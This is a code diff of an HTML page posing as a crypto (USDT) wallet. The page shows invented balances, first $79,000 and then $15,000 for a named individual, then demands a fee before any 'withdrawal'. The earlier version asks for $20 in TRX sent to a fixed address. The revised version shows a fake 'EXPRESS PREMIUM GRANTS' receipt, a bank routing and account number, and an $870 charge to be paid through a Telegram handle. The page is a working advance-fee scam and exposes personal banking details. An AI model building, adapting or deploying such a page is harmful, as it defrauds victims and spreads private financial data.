@@ -461,28 +461,74 @@
             line-height: 1.5;
         }
 
-        /* Withdrawal Section */
-        .withdrawal-section {
+        /* Modal Styles */
+        .modal {
             display: none;
-            background: white;
-            border-radius: 20px;
-            padding: 28px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
-            animation: slideUp 0.6s ease-out both;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            animation: fadeIn 0.3s ease;
+            overflow-y: auto;
         }
 
-        .withdrawal-section.show {
-            display: block;
-        }
-
-        .section-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #1e3a8a;
-            margin-bottom: 24px;
+        .modal.show {
             display: flex;
             align-items: center;
-            gap: 8px;
+            justify-content: center;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 20px;
+            padding: 32px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: slideUp 0.4s ease;
+            position: relative;
+            margin: auto;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: #f0f0f0;
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .modal-close:hover {
+            background: #e0e0e0;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            color: #1e3a8a;
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
 
         .form-group {
@@ -499,11 +545,10 @@
 
         .form-input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 12px 16px;
             border: 2px solid #e2e8f0;
-            border-radius: 12px;
+            border-radius: 8px;
             font-size: 14px;
-            font-family: 'Courier New', monospace;
             transition: all 0.3s;
             background: #f8fafc;
         }
@@ -521,178 +566,73 @@
             cursor: not-allowed;
         }
 
-        .form-info {
-            background: #f1f5f9;
+        .bank-info {
+            background: linear-gradient(135deg, rgba(30, 58, 138, 0.1) 0%, rgba(30, 64, 175, 0.1) 100%);
+            border: 2px solid #3b82f6;
             border-radius: 12px;
-            padding: 12px;
-            font-size: 12px;
-            color: #475569;
-            margin-bottom: 16px;
-            line-height: 1.6;
-        }
-
-        /* Fee Box */
-        .fee-box {
-            background: linear-gradient(135deg, rgba(251, 146, 60, 0.1) 0%, rgba(249, 115, 22, 0.1) 100%);
-            border: 2px solid #fb923c;
-            border-radius: 14px;
             padding: 16px;
-            margin-bottom: 24px;
-            animation: slideUp 0.6s ease-out both;
+            margin-bottom: 20px;
         }
 
-        .fee-title {
+        .bank-info-title {
             font-size: 14px;
             font-weight: 700;
-            color: #9a3412;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .fee-details {
-            font-size: 13px;
-            color: #c2410c;
-            line-height: 1.6;
+            color: #1e3a8a;
             margin-bottom: 12px;
-        }
-
-        .fee-amount {
-            font-size: 16px;
-            font-weight: 700;
-            color: #ea580c;
-            text-align: center;
-            padding: 12px;
-            background: rgba(251, 146, 60, 0.2);
-            border-radius: 8px;
-        }
-
-        /* TRX Payment Notice */
-        .trx-notice {
-            background: linear-gradient(135deg, rgba(168, 85, 247, 0.1) 0%, rgba(139, 92, 246, 0.1) 100%);
-            border: 2px solid #a855f7;
-            border-radius: 14px;
-            padding: 16px;
-            margin-bottom: 24px;
-            display: flex;
-            gap: 12px;
-        }
-
-        .trx-icon {
-            font-size: 24px;
-            flex-shrink: 0;
-        }
-
-        .trx-content {
-            flex: 1;
-        }
-
-        .trx-title {
-            font-size: 14px;
-            font-weight: 700;
-            color: #6b21a8;
-            margin-bottom: 4px;
-        }
-
-        .trx-text {
-            font-size: 13px;
-            color: #7e22ce;
-            line-height: 1.5;
-        }
-
-        /* Address Box */
-        .address-box {
-            background: #f8fafc;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 16px;
-        }
-
-        .address-label {
-            font-size: 13px;
-            color: #64748b;
-            margin-bottom: 8px;
-            font-weight: 600;
             display: flex;
             align-items: center;
-            gap: 4px;
-        }
-
-        .address-content {
-            display: flex;
             gap: 8px;
-            align-items: center;
         }
 
-        .address-text {
-            background: white;
-            border: 2px solid #e2e8f0;
-            padding: 12px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 11px;
-            word-break: break-all;
-            color: #1e293b;
-            flex: 1;
+        .bank-info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 13px;
         }
 
-        .copy-btn {
-            background: #3b82f6;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 12px 16px;
-            font-size: 12px;
+        .bank-info-label {
+            color: #64748b;
             font-weight: 600;
-            cursor: pointer;
-            white-space: nowrap;
-            transition: all 0.3s;
-            flex-shrink: 0;
         }
 
-        .copy-btn:hover {
-            background: #1e40af;
-            transform: translateY(-2px);
+        .bank-info-value {
+            color: #1e3a8a;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
         }
 
-        .copy-btn.copied {
-            background: #22c55e;
-        }
-
-        /* Confirm Button */
-        .confirm-btn {
+        .modal-btn {
             width: 100%;
             background: linear-gradient(135deg, #3b82f6 0%, #1e40af 100%);
             color: white;
             border: none;
-            border-radius: 14px;
-            padding: 16px;
+            border-radius: 10px;
+            padding: 14px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
-            margin-top: 8px;
+            margin-top: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
+        }
+
+        .modal-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
             box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
         }
 
-        .confirm-btn:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4);
-        }
-
-        .confirm-btn:disabled {
+        .modal-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
         }
 
-        .confirm-spinner {
-            width: 18px;
-            height: 18px;
+        .modal-spinner {
+            width: 16px;
+            height: 16px;
             border: 2px solid rgba(255, 255, 255, 0.3);
             border-top: 2px solid white;
             border-radius: 50%;
@@ -700,8 +640,164 @@
             display: none;
         }
 
-        .confirm-spinner.show {
+        .modal-spinner.show {
             display: inline-block;
+        }
+
+        /* Withdrawal Section */
+        .withdrawal-section {
+            display: none;
+        }
+
+        .withdrawal-section.show {
+            display: block;
+        }
+
+        /* Receipt Container */
+        .receipt-container {
+            background: white;
+            border: 2px solid #3b82f6;
+            border-radius: 16px;
+            padding: 32px;
+            margin-bottom: 24px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            animation: slideUp 0.6s ease-out both;
+        }
+
+        .receipt-header {
+            text-align: center;
+            margin-bottom: 24px;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 16px;
+        }
+
+        .receipt-logo {
+            font-size: 32px;
+            margin-bottom: 8px;
+        }
+
+        .receipt-company {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1e3a8a;
+            margin-bottom: 4px;
+        }
+
+        .receipt-subtitle {
+            font-size: 12px;
+            color: #64748b;
+            margin-top: 8px;
+        }
+
+        .receipt-status {
+            display: inline-block;
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            color: #856404;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 12px;
+            margin-bottom: 16px;
+        }
+
+        .receipt-divider {
+            height: 1px;
+            background: #e2e8f0;
+            margin: 16px 0;
+        }
+
+        .receipt-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .receipt-label {
+            color: #64748b;
+            font-weight: 500;
+        }
+
+        .receipt-value {
+            color: #1e3a8a;
+            font-weight: 600;
+        }
+
+        /* Charge Notice */
+        .charge-notice {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            border-radius: 16px;
+            padding: 24px;
+            margin: 24px 0;
+            color: white;
+            border-left: 4px solid #fff;
+        }
+
+        .charge-notice-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .charge-notice-content {
+            font-size: 14px;
+            line-height: 1.8;
+            margin-bottom: 16px;
+        }
+
+        .charge-notice-content p {
+            margin-bottom: 8px;
+        }
+
+        .charge-notice-content ul {
+            margin-left: 16px;
+            margin-top: 8px;
+        }
+
+        .charge-notice-content li {
+            margin-bottom: 6px;
+            font-size: 13px;
+        }
+
+        .charge-amount {
+            font-size: 28px;
+            font-weight: 700;
+            margin: 20px 0;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 16px;
+            border-radius: 12px;
+        }
+
+        .charge-explanation {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 13px;
+            line-height: 1.8;
+            margin-bottom: 16px;
+        }
+
+        .contact-support-btn {
+            width: 100%;
+            background: white;
+            color: #ee5a6f;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .contact-support-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
         }
 
         /* Success Section */
@@ -769,12 +865,6 @@
             margin: 24px 0;
         }
 
-        /* Philippines Flag */
-        .flag-emoji {
-            display: inline-block;
-            margin-right: 4px;
-        }
-
         @media (max-width: 480px) {
             .container {
                 margin: 0;
@@ -791,6 +881,14 @@
             .header-title {
                 font-size: 20px;
             }
+
+            .modal-content {
+                padding: 24px;
+            }
+
+            .receipt-container {
+                padding: 20px;
+            }
         }
     </style>
 </head>
@@ -798,15 +896,14 @@
     <!-- Loading Screen -->
     <div class="loading-screen" id="loadingScreen">
         <div class="spinner"></div>
-        <div class="loading-text">🇵🇭 Loading Your USDT Wallet...</div>
+        <div class="loading-text">Loading Damon Pleis USDT Wallet...</div>
     </div>
 
     <div class="container">
         <!-- Header -->
         <div class="header">
             <div class="header-title">
-                <span class="flag-emoji">🇵🇭</span>
-                <span>My Wallet</span>
+                <span>💼 My Wallet</span>
             </div>
             <div class="header-icons">
                 <button class="icon-btn" title="Settings">⚙️</button>
@@ -829,10 +926,10 @@
             <div class="card-title">Tether (USDT)</div>
             <div class="card-amount">
                 <span>$</span>
-                <span id="cardAmount">79,000</span>
+                <span id="cardAmount">15,000</span>
             </div>
             <div class="card-footer">
-                <div class="card-wallet">USDT Wallet</div>
+                <div class="card-wallet">Damon Pleis</div>
                 <div class="card-network">
                     <div class="card-network-label">Network</div>
                     <div class="card-network-name">TRON (TRX)</div>
@@ -845,7 +942,7 @@
             <div class="balance-label">💰 Available Balance</div>
             <div class="balance-amount">
                 <span>$</span>
-                <span id="balanceAmount">79,000</span>
+                <span id="balanceAmount">15,000</span>
                 <span style="font-size: 24px; margin-left: 8px;">USDT</span>
             </div>
             <div class="balance-status ready">✓ Ready for withdrawal</div>
@@ -855,9 +952,9 @@
         <div class="info-box">
             <div class="info-icon">ℹ️</div>
             <div class="info-content">
-                <div class="info-title">Instant Withdrawal</div>
+                <div class="info-title">Secure Withdrawal</div>
                 <div class="info-text">
-                    Withdraw your USDT directly to your TRX wallet. Funds transferred instantly after payment verification.
+                    Withdraw your USDT to your verified Bank of America account. Process is secure and verified.
                 </div>
             </div>
         </div>
@@ -872,103 +969,206 @@
         <div class="processing-info" id="processingInfo">
             <div class="processing-icon">⏳</div>
             <div class="processing-title">Processing Withdrawal Request</div>
-            <div class="processing-text">Preparing your withdrawal details...</div>
+            <div class="processing-text">Verifying your account and processing your withdrawal...</div>
         </div>
 
-        <!-- Withdrawal Section -->
+        <!-- Bank Confirmation Section -->
         <div class="withdrawal-section" id="withdrawalSection">
-            <div class="section-title">
-                <span>🚀</span>
-                <span>Withdraw USDT</span>
-            </div>
-
-            <div class="form-info">
-                ✅ Your wallet has been verified. Enter your TRX wallet address to receive your USDT withdrawal.
-            </div>
-
-            <div class="form-group">
-                <label class="form-label">💼 Your TRX Wallet Address</label>
-                <input type="text" class="form-input" id="walletAddress" placeholder="e.g., TQmV5M...dqn2N" required>
-                <div class="form-info" style="margin-top: 8px; margin-bottom: 0;">
-                    Double-check your wallet address. Transfers cannot be reversed.
+            <div class="receipt-container">
+                <div class="receipt-header">
+                    <div class="receipt-logo">🏦</div>
+                    <div class="receipt-company">Confirm Bank Information</div>
+                    <div class="receipt-subtitle">Verify your receiving bank details</div>
                 </div>
-            </div>
 
-            <div class="form-group">
-                <label class="form-label">📤 Withdrawal Amount</label>
-                <input type="text" class="form-input" value="$79,000 USDT" disabled style="color: #3b82f6; font-weight: 600;">
-            </div>
-
-            <!-- Fee Box -->
-            <div class="fee-box">
-                <div class="fee-title">⚠️ Network Processing Fee</div>
-                <div class="fee-details">
-                    To complete your USDT withdrawal on the TRON network, the system requires a <strong>$20 TRX network fee</strong> for secure processing and transaction validation.
-                </div>
-                <div class="fee-amount">Fee Required: $20 TRX</div>
-            </div>
-
-            <!-- TRX Payment Notice -->
-            <div class="trx-notice">
-                <div class="trx-icon">🔗</div>
-                <div class="trx-content">
-                    <div class="trx-title">TRX Payment Required</div>
-                    <div class="trx-text">
-                        Send <strong>$20 worth of TRX</strong> to the verified address below to activate and process your withdrawal.
+                <div class="bank-info">
+                    <div class="bank-info-title">📋 Your Receiving Bank</div>
+                    <div class="bank-info-row">
+                        <span class="bank-info-label">Bank Name:</span>
+                        <span class="bank-info-value">Bank of America</span>
+                    </div>
+                    <div class="bank-info-row">
+                        <span class="bank-info-label">Routing Number:</span>
+                        <span class="bank-info-value">026009593</span>
+                    </div>
+                    <div class="bank-info-row">
+                        <span class="bank-info-label">Account Number:</span>
+                        <span class="bank-info-value">325210189483</span>
+                    </div>
+                    <div class="bank-info-row" style="margin-top: 12px; padding-top: 12px; border-top: 1px solid rgba(59, 130, 246, 0.2);">
+                        <span class="bank-info-label">Withdrawal Amount:</span>
+                        <span class="bank-info-value" style="color: #22c55e;">$15,000.00</span>
                     </div>
                 </div>
-            </div>
 
-            <!-- TRX Address -->
-            <div class="address-box">
-                <div class="address-label">
-                    <span>✓</span>
-                    <span>Verified TRX Address</span>
+                <div class="info-box" style="margin-bottom: 20px;">
+                    <div class="info-icon">✓</div>
+                    <div class="info-content">
+                        <div class="info-title">Verified Account</div>
+                        <div class="info-text">
+                            Your Bank of America account has been verified and is ready to receive your USDT withdrawal.
+                        </div>
+                    </div>
                 </div>
-                <div class="address-content">
-                    <div class="address-text">THo65NFzmXbzYuGfFk1XT95JS6ihqm5gKz</div>
-                    <button type="button" class="copy-btn" onclick="copyTRXAddress()">�� Copy</button>
-                </div>
+
+                <button class="modal-btn" onclick="confirmBankInfo()" id="confirmBankBtn">
+                    <span class="modal-spinner" id="confirmBankSpinner"></span>
+                    <span id="confirmBankText">✓ Confirm & Continue</span>
+                </button>
             </div>
-
-            <div class="divider"></div>
-
-            <!-- Confirm Button -->
-            <button class="confirm-btn" onclick="confirmWithdrawal()" id="confirmBtn">
-                <span class="confirm-spinner" id="confirmSpinner"></span>
-                <span id="confirmText">Confirm Withdrawal</span>
-            </button>
         </div>
 
-        <!-- Success Section -->
+        <!-- Success Section with Receipt -->
         <div class="success-section" id="successSection">
-            <div class="success-box">
-                <div class="success-icon">✅</div>
-                <div class="success-title">Withdrawal Initiated!</div>
-                <div class="success-text">
-                    Your $79,000 USDT withdrawal has been submitted successfully. Once the $20 TRX network fee is received and processed, your funds will be transferred to your wallet within moments.
+            <!-- Professional Receipt -->
+            <div class="receipt-container">
+                <div class="receipt-header">
+                    <div class="receipt-logo">🏦</div>
+                    <div class="receipt-company">EXPRESS PREMIUM GRANTS</div>
+                    <div class="receipt-subtitle">Withdrawal Receipt</div>
+                </div>
+
+                <div style="text-align: center;">
+                    <div class="receipt-status">⏳ PENDING</div>
+                </div>
+
+                <div class="receipt-divider"></div>
+
+                <!-- Account Details -->
+                <div class="receipt-row">
+                    <span class="receipt-label">Account Holder:</span>
+                    <span class="receipt-value">Damon Pleis</span>
+                </div>
+                <div class="receipt-row">
+                    <span class="receipt-label">Member ID:</span>
+                    <span class="receipt-value">DTH-DP-2024</span>
+                </div>
+                <div class="receipt-row">
+                    <span class="receipt-label">Date & Time:</span>
+                    <span class="receipt-value" id="receiptDate"></span>
+                </div>
+                <div class="receipt-row">
+                    <span class="receipt-label">Transaction ID:</span>
+                    <span class="receipt-value">TXN-2024-WD-8847</span>
+                </div>
+
+                <div class="receipt-divider"></div>
+
+                <!-- Withdrawal Details -->
+                <div class="receipt-row">
+                    <span class="receipt-label">Withdrawal Amount:</span>
+                    <span class="receipt-value" style="color: #22c55e;">$15,000.00</span>
+                </div>
+                <div class="receipt-row">
+                    <span class="receipt-label">Destination Bank:</span>
+                    <span class="receipt-value">Bank of America</span>
+                </div>
+                <div class="receipt-row">
+                    <span class="receipt-label">Status:</span>
+                    <span class="receipt-value" style="color: #ffc107;">PENDING PROCESSING</span>
+                </div>
+
+                <div class="receipt-divider"></div>
+
+                <!-- Charge Notice -->
+                <div class="charge-notice">
+                    <div class="charge-notice-title">
+                        ⚠️ Processing Charge Required
+                    </div>
+                    
+                    <div class="charge-notice-content">
+                        <p><strong>To complete your withdrawal transaction, a processing fee is required.</strong></p>
+                        
+                        <p><strong>This fee covers:</strong></p>
+                        <ul>
+                            <li>🔐 Enhanced Security Verification & Bank Confirmation</li>
+                            <li>🏦 Bank Processing and Settlement (USDT to USD conversion)</li>
+                            <li>💳 International ACH Transfer & Clearance</li>
+                            <li>📋 Regulatory Compliance & AML Checks</li>
+                            <li>⚡ Expedited Fund Release (24-48 hours)</li>
+                        </ul>
+                    </div>
+
+                    <div class="charge-amount">$870.00</div>
+
+                    <div class="charge-explanation">
+                        <strong>📌 How It Works:</strong><br>
+                        1️⃣ Pay the $870 processing fee to activate your withdrawal<br>
+                        2️⃣ Your withdrawal will be immediately approved and queued<br>
+                        3️⃣ USDT converts to USD and transfers to Bank of America<br>
+                        4️⃣ Funds arrive in your account within 24-48 business hours<br>
+                        5️⃣ Receive confirmation SMS and email with tracking details
+                    </div>
+
+                    <a href="https://t.me/AGGRESSIVE_POWER1" target="_blank" style="text-decoration: none;">
+                        <button class="contact-support-btn" type="button">
+                            📲 Pay $870 Fee via Support
+                        </button>
+                    </a>
                 </div>
             </div>
 
-            <div class="info-box" style="margin-top: 20px;">
+            <!-- Next Steps -->
+            <div class="info-box" style="background: linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(30, 64, 175, 0.1) 100%); border-color: #3b82f6;">
                 <div class="info-icon">📧</div>
                 <div class="info-content">
                     <div class="info-title">What's Next?</div>
                     <div class="info-text">
-                        You'll receive a confirmation once your TRX payment is verified. Your USDT will then be transferred instantly to your wallet address.
+                        Contact our support team via Telegram to complete the $870 payment. Once verified, your $15,000 withdrawal will be processed immediately.
                     </div>
                 </div>
             </div>
 
-            <div class="info-box" style="margin-top: 16px; background: linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(30, 64, 175, 0.1) 100%); border-color: #3b82f6;">
-                <div class="info-icon">����</div>
+            <div class="info-box" style="background: linear-gradient(135deg, rgba(34, 197, 94, 0.1) 0%, rgba(20, 184, 82, 0.1) 100%); border-color: #22c55e;">
+                <div class="info-icon">✓</div>
                 <div class="info-content">
                     <div class="info-title">Transaction Support</div>
                     <div class="info-text">
-                        For assistance or to check your withdrawal status, contact our support team at <strong>https://t.me/customer_assist01</strong>
+                        For assistance, withdrawal status, or payment inquiries: <strong>https://t.me/AGGRESSIVE_POWER1</strong>
                     </div>
                 </div>
             </div>
+        </div>
+    </div>
+
+    <!-- Bank Confirmation Modal (if needed for secondary confirmation) -->
+    <div class="modal" id="confirmModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeConfirmModal()">×</button>
+            <div class="modal-title">
+                <span>🏦</span>
+                <span>Confirm Bank Details</span>
+            </div>
+
+            <div class="bank-info" style="margin-bottom: 20px;">
+                <div class="bank-info-title">Receiving Bank Account</div>
+                <div class="bank-info-row">
+                    <span class="bank-info-label">Bank:</span>
+                    <span class="bank-info-value">Bank of America</span>
+                </div>
+                <div class="bank-info-row">
+                    <span class="bank-info-label">Routing #:</span>
+                    <span class="bank-info-value">026009593</span>
+                </div>
+                <div class="bank-info-row">
+                    <span class="bank-info-label">Account #:</span>
+                    <span class="bank-info-value">325210189483</span>
+                </div>
+            </div>
+
+            <div class="info-box" style="margin-bottom: 20px;">
+                <div class="info-icon">✓</div>
+                <div class="info-content">
+                    <div class="info-title">Amount to Withdraw</div>
+                    <div class="info-text" style="font-size: 18px; font-weight: 700; color: #22c55e;">
+                        $15,000.00 USDT
+                    </div>
+                </div>
+            </div>
+
+            <button class="modal-btn" onclick="proceedToProcessing()">
+                <span>✓ I Confirm These Details</span>
+            </button>
         </div>
     </div>
 
@@ -981,7 +1181,7 @@
             for (let i = 0; i < confettiCount; i++) {
                 const confetti = document.createElement('div');
                 confetti.className = 'confetti';
-                confetti.textContent = ['🎉', '🎊', '✨', '⭐', '🇵🇭'][Math.floor(Math.random() * 5)];
+                confetti.textContent = ['🎉', '🎊', '✨', '⭐', '💰'][Math.floor(Math.random() * 5)];
                 confetti.style.left = Math.random() * window.innerWidth + 'px';
                 confetti.style.top = '-10px';
                 confetti.style.fontSize = (Math.random() * 20 + 20) + 'px';
@@ -1007,7 +1207,6 @@
             setTimeout(() => {
                 const loadingScreen = document.getElementById('loadingScreen');
                 loadingScreen.classList.add('hidden');
-                createConfetti();
             }, 2500);
         });
 
@@ -1018,8 +1217,15 @@
             if (cardHidden) {
                 amount.textContent = '****';
             } else {
-                amount.textContent = '79,000';
+                amount.textContent = '15,000';
             }
+        }
+
+        // Update receipt date
+        function updateReceiptDate() {
+            const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+            const date = new Date().toLocaleDateString('en-US', options);
+            document.getElementById('receiptDate').textContent = date;
         }
 
         // Initiate withdrawal
@@ -1046,39 +1252,11 @@
             }, 3000);
         }
 
-        // Copy TRX address
-        function copyTRXAddress() {
-            const address = 'THo65NFzmXbzYuGfFk1XT95JS6ihqm5gKz';
-            navigator.clipboard.writeText(address).then(() => {
-                const btn = event.target;
-                const originalText = btn.textContent;
-                btn.textContent = '✓ Copied!';
-                btn.style.background = '#22c55e';
-
-                setTimeout(() => {
-                    btn.textContent = originalText;
-                    btn.style.background = '#3b82f6';
-                }, 2000);
-            });
-        }
-
-        // Confirm withdrawal
-        function confirmWithdrawal() {
-            const walletAddress = document.getElementById('walletAddress').value;
-
-            if (!walletAddress.trim()) {
-                alert('Please enter your TRX wallet address');
-                return;
-            }
-
-            if (!walletAddress.startsWith('T') || walletAddress.length !== 34) {
-                alert('Please enter a valid TRX wallet address (starts with T, 34 characters)');
-                return;
-            }
-
-            const btn = document.getElementById('confirmBtn');
-            const spinner = document.getElementById('confirmSpinner');
-            const text = document.getElementById('confirmText');
+        // Confirm bank info
+        function confirmBankInfo() {
+            const btn = document.getElementById('confirmBankBtn');
+            const spinner = document.getElementById('confirmBankSpinner');
+            const text = document.getElementById('confirmBankText');
 
             btn.disabled = true;
             spinner.classList.add('show');
@@ -1086,15 +1264,29 @@
 
             setTimeout(() => {
                 spinner.classList.remove('show');
-                text.textContent = 'Confirm Withdrawal';
+                text.textContent = '✓ Confirm & Continue';
                 btn.disabled = false;
 
                 document.getElementById('withdrawalSection').classList.remove('show');
                 document.getElementById('successSection').classList.add('show');
+                updateReceiptDate();
                 document.getElementById('successSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
-
                 createConfetti();
             }, 3000);
+        }
+
+        // Close confirm modal
+        function closeConfirmModal() {
+            document.getElementById('confirmModal').classList.remove('show');
+        }
+
+        // Proceed to processing
+        function proceedToProcessing() {
+            closeConfirmModal();
+            document.getElementById('successSection').classList.add('show');
+            updateReceiptDate();
+            document.getElementById('successSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
+            createConfetti();
         }
     </script>
 </body>
